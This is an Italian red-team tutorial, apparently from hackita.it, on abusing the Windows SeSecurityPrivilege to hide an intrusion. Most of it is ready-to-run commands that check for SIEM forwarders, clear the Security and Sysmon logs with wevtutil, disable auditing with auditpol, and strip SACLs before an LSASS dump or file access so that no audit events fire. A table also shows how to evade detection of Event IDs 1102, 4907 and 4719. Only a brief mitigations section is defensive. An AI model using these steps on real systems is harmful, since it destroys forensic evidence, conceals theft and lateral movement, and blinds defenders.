---
title: 'SeSecurityPrivilege: Cancella Log, SACL e SIEM Evasion'
slug: sesecurityprivilege
description: >-
  Come usare SeSecurityPrivilege per leggere e cancellare il Security Log,
  rimuovere SACL e operare invisibili su Windows. Guida Red Team OpSec con
  verifica SIEM.
image: /SeSecurityPrivilege.webp
draft: false
date: 2026-06-23T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - sesecurityprivilege
  - log-clearing
  - sacl-manipulation
---

Hai eseguito l'escalation, dumpato credenziali, ti sei mosso lateralmente. Ogni passo è nel Security Log. Con SeSecurityPrivilege: prima leggi il log per capire cosa monitora il blue team, poi rimuovi le SACL dagli oggetti che ti servono, poi cancella le tracce. Ma prima di tutto — verifica se c'è un SIEM attivo.

***

## Quick Exploit

```cmd
sc query SplunkForwarder
netstat -an | findstr ":514 :9997 :5985"
```

Se nessun forwarder attivo:

```cmd
wevtutil cl Security
wevtutil cl "Microsoft-Windows-Sysmon/Operational"
```

Approccio chirurgico (più stealth del log clearing):

```powershell
$acl = Get-Acl "C:\sensitive\file.txt"
$acl.SetAuditRuleProtection($true, $false)
Set-Acl "C:\sensitive\file.txt" $acl
```

***

## Attack Chain

```
SeSecurityPrivilege Enabled
  → Step 1: verifica SIEM forwarding (sc query + netstat)
  → Step 2: auditpol /get /category:* → capisce cosa viene loggato
  → Step 3: wevtutil qe Security → leggi baseline attività admin
  → Step 4: SACL removal sugli oggetti target prima di accederli
  → Step 5: esegui operazioni (dump, accessi, movimento)
  → Step 6: wevtutil cl Security + Sysmon (solo se no SIEM live)
```

***

## Tool Decision

| Obiettivo                      | Comando                                                                     |
| ------------------------------ | --------------------------------------------------------------------------- |
| Verifica SIEM forwarding       | `sc query SplunkForwarder` / `sc query nxlog` / `netstat`                   |
| Intelligence audit attivo      | `auditpol /get /category:*`                                                 |
| Leggi log admin per timing     | `wevtutil qe Security /q:"*[System[EventID=4624]]" /c:50 /f:text`           |
| Cancella Security Log          | `wevtutil cl Security`                                                      |
| Cancella Sysmon                | `wevtutil cl "Microsoft-Windows-Sysmon/Operational"`                        |
| Rimuovi SACL da file (stealth) | PowerShell `SetAuditRuleProtection($true, $false)`                          |
| Rimuovi SACL con SetACL        | `SetACL.exe -on [path] -ot file -actn clear -clr sacl`                      |
| Disabilita audit Object Access | `auditpol /set /category:"Object Access" /success:disable /failure:disable` |

***

## Cos'è SeSecurityPrivilege

Permette tre operazioni distinte sul sistema di audit:

1. **Leggere e modificare il Security Event Log**
2. **Gestire le SACL** (System Access Control List) di qualsiasi oggetto senza essere owner
3. **Cancellare il Security Log** e modificare le audit policy

Non è un vettore di escalation — è lo strumento per gestire la visibilità dell'engagement. In un red team professionale, l'OpSec è parte del deliverable.

***

## Quando esiste

* **Administrators** (token elevato)
* **Event Log Administrators** — gruppo locale specifico
* **Account di security monitoring** — SIEM agent, log collector
* **Compliance software** service account

Verifica:

```cmd
whoami /priv
```

Cerchi:

```
SeSecurityPrivilege    Manage auditing and security log    Enabled
```

Chi ha il privilegio nel sistema:

```cmd
accesschk.exe -a SeSecurityPrivilege *
```

***

## Step 1 — Leggi il log prima di agire (intelligence)

Prima di eseguire operazioni rumorose, leggi il Security Log per capire cosa viene auditato e la baseline di attività normali:

```cmd
auditpol /get /category:*
```

Questo mostra esattamente cosa viene loggato — dove puoi operare silenziosamente e dove no.

Leggi gli ultimi eventi di logon per capire gli orari degli admin:

```cmd
wevtutil qe Security /q:"*[System[EventID=4624]]" /c:50 /rd:true /f:text
```

Leggi i tentativi di uso privilegi (cosa viene auditato):

```cmd
wevtutil qe Security /q:"*[System[EventID=4673]]" /c:50 /f:text
```

Visualizza gli ultimi 100 eventi con PowerShell:

```powershell
Get-EventLog -LogName Security -Newest 100 | Group-Object EventID | Sort-Object Count -Descending | Select-Object Name, Count
```

***

## Step 2 — Verifica se i log vengono forwardati a un SIEM

Questo è il passo più importante prima di cancellare qualsiasi log. Se c'è forwarding real-time, cancellare il log locale è inutile — gli eventi sono già nel SIEM.

Cerca servizi di log forwarding attivi:

```cmd
sc query "SplunkForwarder"
sc query "nxlog"
sc query "winrm"
```

Cerca connessioni attive verso porte SIEM comuni:

```cmd
netstat -an | findstr ":514 :9997 :5985 :6514"
```

Se nessun forwarder è attivo → cancellare il log ha senso. Se è attivo → gli eventi esistono già nel SIEM, il 1102 (log cleared) genererà un alert immediato.

***

## Step 3 — Cancella il Security Log

```cmd
wevtutil cl Security
```

Nessun output visibile se va a buon fine.

Con PowerShell:

```powershell
Clear-EventLog -LogName Security
```

**Il paradosso:** La cancellazione genera **Event ID 1102** (Security log cleared). Se c'è SIEM con forwarding real-time, il 1102 è già nel SIEM prima che tu abbia finito di cancellare. Valuta sempre il passo 2 prima.

***

## Varianti

### Cancella log aggiuntivi

```cmd
wevtutil cl System
```

```cmd
wevtutil cl Application
```

Cancella Sysmon operational (se presente — elimina le tracce più dettagliate):

```cmd
wevtutil cl "Microsoft-Windows-Sysmon/Operational"
```

Lista tutti i log disponibili nel sistema:

```cmd
wevtutil el
```

### Disabilita audit policy per categorie specifiche

Per smettere di generare eventi futuri senza cancellare quelli passati. Disabilita Object Access (file e registry non vengono più loggati):

```cmd
auditpol /set /category:"Object Access" /success:disable /failure:disable
```

Disabilita tutto (genera Event ID 4719 — visibile se il SIEM forwarda):

```cmd
auditpol /clear
```

### SACL manipulation — approccio chirurgico

La tecnica più stealth: rimuovi la SACL dall'oggetto specifico **prima** di accederlo. Le operazioni successive su quell'oggetto non generano eventi di audit.

Rimuovi SACL con PowerShell (su un file specifico):

```powershell
$path = "C:\sensitive\data.txt"
$acl = Get-Acl $path
$acl.SetAuditRuleProtection($true, $false)
Set-Acl $path $acl
```

Poi accedi al file → nessun Event ID 4663 generato.

Con SetACL per più controllo — scaricabile da [helgeklein.com/setacl](https://helgeklein.com/setacl/):

Backup della SACL originale:

```cmd
SetACL.exe -on C:\sensitive\data.txt -ot file -actn list -lst "f:sddl" > C:\temp\sacl_backup.txt
```

Rimuovi la SACL:

```cmd
SetACL.exe -on C:\sensitive\data.txt -ot file -actn clear -clr sacl
```

Accedi al file (nessun evento di audit generato), poi ripristina:

```cmd
SetACL.exe -on C:\sensitive\data.txt -ot file -actn restore -bckp C:\temp\sacl_backup.txt
```

***

## Workflow OpSec consigliato

```
1. auditpol /get /category:*          → capisce cosa viene loggato
2. wevtutil qe Security (EventID=4624) → identifica orari admin
3. sc query SplunkForwarder + netstat  → verifica forwarding SIEM
4. SACL removal su oggetti target      → accessi futuri non loggati
5. Esegui le operazioni
6. Log clearing solo se no SIEM live
```

***

## Scenari reali

**Pre-LSASS dump** — rimuovi SACL da `lsass.exe` prima del dump → nessun Event ID 4656/4663 generato per quell'oggetto specifico.

**Intelligence pre-laterale** — leggi Event ID 4624 del DC per identificare quando domain.admin fa login e da dove → pianifica il lateral movement nella finestra giusta.

**Post-exploitation cleanup** — nessun SIEM forwarding attivo → cancella Security Log locale + Sysmon → riduci le tracce forensi.

***

## Errori comuni

**`wevtutil cl Security` → Access Denied** — Token non elevato. Avvia processo elevato.

**Hai cancellato il log ma il SIEM ha già tutto** — SIEM con forwarding real-time. Event ID 1102 (log cleared) è già nel SIEM prima che tu finisca di digitare il comando. Verifica SEMPRE prima con `sc query` + `netstat`.

**SACL removal genera Event ID 4907** — "Audit Policy Change" è abilitato e il SIEM lo forwarda. Usa SACL removal granulare (solo gli oggetti specifici) invece di clearing massiccio.

**`auditpol /clear` genera 4719 visibile al SIEM** — Disabilita solo le categorie specifiche che ti servono invece di svuotare tutto: `auditpol /set /category:"Object Access" /success:disable /failure:disable`.

***

## Detection e bypass (Red Team view)

| Cosa rileva il Blue Team                 | Come lo bypassa il Red Team                                                                                                 |
| ---------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| **Event ID 1102** — Security log cleared | Impossibile evitarlo — è generato prima della cancellazione. Soluzione: usa SACL removal chirurgica invece del log clearing |
| Drop improvviso volume eventi nel SIEM   | Cancella in modo graduale o durante finestre di bassa attività                                                              |
| **Event ID 4907** — SACL modificata      | Rimuovi SACL solo su oggetti specifici, non in modo massiccio                                                               |
| **Event ID 4719** — audit policy changed | Usa `auditpol` per categorie specifiche invece di `/clear` globale                                                          |

***

## Quando fallisce

* **Token non elevato** → Access Denied su `wevtutil cl`
* **SIEM real-time forwarding** → log clearing locale inutile, 1102 già forwardato
* **Event ID 4907** da SACL modification → se "Audit Policy Change" abilitato

***

## Mitigazioni

* **Log forwarding real-time a SIEM** — mitigazione principale: clearing locale irrilevante
* Alert immediato su Event ID 1102 — nessun motivo legittimo in produzione
* Log retention centralizzata su infrastruttura non raggiungibile dall'endpoint
* Limitare SeSecurityPrivilege al minimo necessario

**Nota realistica:** In ambienti senza SIEM (comuni nelle PMI e in molti segmenti enterprise), il log clearing locale elimina tutte le evidenze. In ambienti con SIEM real-time, l'Event ID 1102 è spesso uno dei pochi alert configurati con priorità alta — aspettati una risposta rapida.

***

## FAQ

**SACL manipulation è più stealth del log clearing?**
Sì — genera solo Event ID 4907 (se "Audit Policy Change" è abilitato) invece del vistoso 1102. Rimuovi SACL solo dagli oggetti specifici che ti servono, non in modo massiccio.

**Come verifico se c'è un SIEM attivo?**
`sc query SplunkForwarder`, `sc query nxlog`, `sc query "Elastic Agent"`, poi `netstat -an | findstr ":514 :9997 :5985 :6514"`. Un agente attivo = gli eventi sono già altrove.

**Posso usarlo per leggere il log degli admin prima di agire?**
Sì — `wevtutil qe Security /q:"*[System[EventID=4624]]"` mostra quando e da dove si connettono gli admin. Utile per pianificare il timing del lateral movement.

***

SeSecurityPrivilege è il privilegio per l'OpSec del red teamer — ma prima di cancellare qualsiasi log, verifica sempre se c'è un SIEM in ascolto.

***

**Articoli correlati:**

* [SeBackupPrivilege](https://hackita.it/articoli/sebackupprivilege) — dump credenziali da eseguire con copertura SACL
* [SeDebugPrivilege](https://hackita.it/articoli/sedebugprivilege) — LSASS dump da fare dopo aver rimosso SACL da lsass

**Riferimenti:** [SetACL](https://helgeklein.com/setacl/) · [Microsoft Docs](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log)

Per approfondire le tecniche red team e OpSec su Windows: [hackita.it/servizi](https://hackita.it/servizi)
